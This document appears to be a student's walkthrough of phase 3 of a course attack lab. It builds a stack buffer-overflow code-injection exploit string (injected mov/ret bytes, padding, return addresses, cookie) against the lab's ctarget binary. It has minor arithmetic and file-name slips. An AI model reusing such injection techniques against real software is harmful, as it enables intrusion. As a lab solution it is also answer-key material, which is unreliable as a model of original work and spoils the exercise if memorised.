# Phase 3

Phase 3 is kinda similar to phase two except that we are trying to call the function touch3 and have to pass our cookie to it as string

In the instruction it tells you that if you store the cookie in the buffer allocated for getbuf, the functions hexmatch and strncmp may overwrite it as they will be pushing data on to the stack, so you have to be careful where you store it.

We will be storing the cookie after touch3.

So let's pass the address for the cookie to register $rdi

The total bytes before the cookie are ```buffer + 8 bytes for return address of rsp + 8 bytes for touch3 0x18 + 8 + 8 = 28 ``` (40 decimnal)

Locate the ```touch3``` func in the ```rtarget_dump.s``` file
```assembly
0000000000401a56 <touch3>:
  401a56:       53                      push   %rbx
  401a57:       48 89 fb                mov    %rdi,%rbx
  401a5a:       c7 05 b8 3a 20 00 03    movl   $0x3,0x203ab8(%rip)        # 60551c <vlevel>
  401a61:       00 00 00 
  401a64:       48 89 fe                mov    %rdi,%rsi
  401a67:       8b 3d b7 3a 20 00       mov    0x203ab7(%rip),%edi        # 605524 <cookie>
  401a6d:       e8 33 ff ff ff          callq  4019a5 <hexmatch>
  401a72:       85 c0                   test   %eax,%eax
  401a74:       74 23                   je     401a99 <touch3+0x43>
  401a76:       48 89 da                mov    %rbx,%rdx
  401a79:       be 20 35 40 00          mov    $0x403520,%esi
  401a7e:       bf 01 00 00 00          mov    $0x1,%edi
  401a83:       b8 00 00 00 00          mov    $0x0,%eax
  401a88:       e8 73 f3 ff ff          callq  400e00 <__printf_chk@plt>
  401a8d:       bf 03 00 00 00          mov    $0x3,%edi
  401a92:       e8 5b 04 00 00          callq  401ef2 <validate>
  401a97:       eb 21                   jmp    401aba <touch3+0x64>
  401a99:       48 89 da                mov    %rbx,%rdx
  401a9c:       be 48 35 40 00          mov    $0x403548,%esi
  401aa1:       bf 01 00 00 00          mov    $0x1,%edi
  401aa6:       b8 00 00 00 00          mov    $0x0,%eax
  401aab:       e8 50 f3 ff ff          callq  400e00 <__printf_chk@plt>
  401ab0:       bf 03 00 00 00          mov    $0x3,%edi
  401ab5:       e8 14 05 00 00          callq  401fce <fail>
  401aba:       bf 00 00 00 00          mov    $0x0,%edi
  401abf:       e8 8c f3 ff ff          callq  400e50 <exit@plt>

```

Grab the address for rsp from phase 2: ``0x55617e98`` Add ```0x28``` ```0x55617e98 + 0x28 = 0x55617EC0``` Now you need this assembly code, same steps generating the byte representation

Create the file ```phase3.s```.

```assembly
    movq $0x55617EC0,%rdi /* %rsp + 0x18 */
    retq
```
Now you need the byte representation of the code you wrote above, compile it with gcc then dissasemble it.

```ssh
gcc -c phase3.s
objdump -d phase3.o  > phase3.d 
```
Now open the file phase2.d and you will get something like below

```assembly
Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 c0 7e 61 55    mov    $0x55617ec0,%rdi
   7:   c3                      retq
```
My cookie ``0x3451d86d``` => ```33 34 35 31 64 38 36 64```

Now, grab the bytes from the above code and start constructing your exploit string. Create a new file named ``phase3.txt``` and here is what mine looks like:

```
48 c7 c7 c0 7e 61 55 c3 /*rsp + 28 the address where the cookie is present*/
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /*padding*/
98 7e 61 55 00 00 00 00 /* return address ($rsp)*/
56 1a 40 00 00 00 00 00 /* touch3 address -- get this from the rtarget dump file */
33 34 35 31 64 38 36 64 /* cookie string*/
```
If you look at the last row above, the cookie is in hex format, so you need to take your cookie and convert in to text format. Go to http://www.unit-conversion.info/texttools/hexadecimal/ and put in your cookie without '0x' and it should give you the text format or you could look up ascii equivalent on your machine

Last step is to generate the raw eploit string using the hex2raw program.

```./hex2raw < phase3.txt > raw-phase3.txt```

Finally, you run the raw file

```./ctarget < raw-phase3.txt```

Response looks like below

```ssh

```
